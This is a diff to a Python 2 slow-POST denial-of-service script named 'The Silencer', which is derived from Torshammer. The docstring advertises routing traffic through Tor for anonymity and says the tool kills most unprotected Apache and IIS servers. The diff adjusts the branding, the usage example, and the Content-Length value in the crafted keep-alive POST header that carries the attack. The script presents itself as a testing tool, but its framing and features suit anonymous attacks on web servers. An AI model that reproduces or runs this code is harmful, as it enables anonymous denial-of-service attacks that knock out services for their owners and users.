@@ -1,10 +1,10 @@
 #!/usr/bin/python
 
 """
-The-Silencer
+The Silencer: https://github.com/haigiang02/the-silencer
 Based on : https://sourceforge.net/projects/torshammer
 
-The silencer is a slow post dos testing tool written in Python.
+The Silencer is a slow post dos testing tool written in Python.
 It can also be run through the Tor network to be anonymized.
 If you are going to run it with Tor it assumes you are running Tor on 127.0.0.1:9050. 
 Kills most unprotected web servers running Apache and IIS via a single instance.
@@ -83,7 +83,7 @@ class httpPost(Thread):
                         "User-Agent: %s\r\n"
                         "Connection: keep-alive\r\n"
                         "Keep-Alive: 874\r\n"
-                        "Content-Length: 10000\r\n"
+                        "Content-Length: 98768\r\n"
                         "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
                         (self.host, random.choice(useragents)))
 
@@ -132,7 +132,7 @@ def usage():
     print " -p|--port <Web Server Port> Defaults to 80"
     print " -T|--tor Enable anonymising through tor on 127.0.0.1:9150, but will slow down the attack. Remember to install and set up Tor before doing this!"
     print " -h|--help Shows this help\n" 
-    print "Eg. ./silencer.py -t 192.168.1.100 -r 256\n"
+    print "Eg. ./thesilencer.py -t 192.168.1.100 -r 256\n"
 
 def main(argv):
     
